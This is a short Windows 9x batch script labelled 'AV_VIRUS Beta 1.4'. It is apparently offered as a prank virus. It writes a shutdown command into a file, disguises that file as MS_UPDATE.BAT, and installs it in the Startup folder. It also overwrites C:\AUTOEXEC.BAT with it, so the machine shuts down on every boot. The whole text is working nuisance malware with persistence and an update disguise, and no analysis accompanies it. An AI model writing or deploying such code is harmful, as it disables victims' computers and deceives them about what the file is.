   @ECHO OFF
   :: Create a text file with the appropiate commands
   ECHO @ECHO OFF > FUN.TXT
   ECHO C:\WINDOWS\RUNDLL.EXE USER.EXE,EXITWINDOWS >>FUN.TXT
   ECHO REM AV_VIRUS BETA 1.3 >>FUN.TXT
   ECHO ECHO THIS IS THE AV_VIRUS BETA 1.4 >>FUN.TXT
   ECHO ECHO SOME REALLY INTERESTING MESSAGE SHOULD GO HERE >>FUN.TXT
   ECHO ECHO JE PENSE DONC JE SUIS - RENE DESCARTES >>FUN.TXT
   ::
   @ECHO OFF
   RENAME FUN.TXT MS_UPDATE.BAT
   COPY MS_UPDATE.BAT C:\WINDOWS\STARTM~1\PROGRAMS\STARTUP
   COPY MS_UPDATE.BAT C:\
   CD C:\
   RENAME MS_UPDATE.BAT AUTOEXEC.BAT
   C:\WINDOWS\RUNDLL.EXE USER.EXE,EXITWINDOWS
   GOTO END
   ::
   :END
   REM AV_Virus Beta 1.4
   REM It's getting better!
   @ECHO OFF
   cls
   REM |CHOICE /TN,2>NUL
   ECHO              BBBBB     Y     Y    EEEEEE    !!
   ECHO              B    B     Y   Y     E         !!
   ECHO              B BBB       Y Y      EEE       !!
   ECHO              B    B       Y       E
   ECHO              BBBBB        Y       EEEEEE    !!








